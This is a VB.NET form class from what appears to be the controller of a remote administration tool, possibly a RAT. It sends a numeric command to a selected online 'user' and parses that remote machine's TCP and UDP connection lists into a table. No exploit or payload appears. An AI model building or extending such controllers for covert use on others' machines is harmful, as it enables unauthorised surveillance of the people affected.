Public Class Networkviewer

    Private Sub ButtonGetConnections_Click(sender As Object, e As EventArgs) Handles ButtonGetConnections.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Refreshing network connections...")
        ListViewConnections.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|40")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Networkviewer")
        End Try
    End Sub

    Public Sub SplitTraffic(ByVal Traffic As String)
        ListViewConnections.Items.Clear()
        Dim TCPCounter As Integer = 0
        Dim UDPCounter As Integer = 0
        Dim AllTraffic As String() = Split(Traffic, "~~~")
        Dim TCPTraffic() = AllTraffic(0).Split({"||||"}, StringSplitOptions.None)
        Dim UDPTraffic() = AllTraffic(1).Split({"||||"}, StringSplitOptions.None)
        For Each line In TCPTraffic
            TCPCounter += 1
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewConnections.Items.Add(parts(0), 0)
            For i = 1 To Math.Min(parts.Length - 1, 5)
                item.SubItems.Add(parts(i))
            Next
        Next
        For Each line In UDPTraffic
            UDPCounter += 1
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewConnections.Items.Add(parts(0), 1)
            For i = 1 To Math.Min(parts.Length - 1, 5)
                item.SubItems.Add(parts(i))
            Next
        Next
        For Each item As ListViewItem In ListViewConnections.Items
            If (String.IsNullOrWhiteSpace(item.Text) Or String.IsNullOrEmpty(item.Text)) Then
                item.Remove()
            End If
        Next
        LabelUDPCount.Text = CType(UDPCounter, String)
        LabelTCPCount.Text = CType(TCPCounter, String)
    End Sub

End Class